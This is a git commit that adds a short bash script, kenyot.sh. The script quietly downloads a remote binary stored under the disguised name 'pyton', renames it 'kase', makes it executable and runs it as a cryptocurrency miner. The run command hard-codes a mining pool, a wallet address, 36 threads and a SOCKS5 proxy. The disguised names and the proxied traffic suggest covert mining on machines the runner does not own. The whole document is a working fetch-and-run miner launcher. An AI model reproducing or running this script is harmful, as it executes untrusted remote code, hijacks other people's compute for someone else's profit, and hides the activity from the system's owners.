6623ace5f1f2bf748bb6c293d54342048567cbec
hndouehdw <95325562+hndouehdw@users.noreply.github.com>
2021-12-05 21:18:41 +0700

    Create kenyot.sh

---
+++ kenyot.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
+chmod +x kase
+./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --thread 36 --proxy socks5:/67.201.33.9:25280
